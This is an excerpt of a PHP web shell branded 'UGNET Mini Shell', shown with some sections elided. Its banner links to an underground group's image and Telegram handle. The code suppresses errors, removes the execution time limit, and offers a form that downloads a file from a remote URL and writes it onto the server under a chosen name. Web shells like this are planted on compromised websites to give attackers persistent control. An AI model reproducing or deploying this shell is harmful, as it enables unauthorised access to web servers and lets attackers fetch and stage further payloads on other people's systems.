...
<center>
<font face="Bungee" size="5">UGNET Mini Shell </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://j.top4top.io/p_3320227z80.png" width="500" height="300" title="UNDERGROUND-NET" alt="UNDERGROUND-NET" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>UGNET Mini Shell</center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://t.me/ugnettsec">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</center>
</form>';
echo "</table><br>";
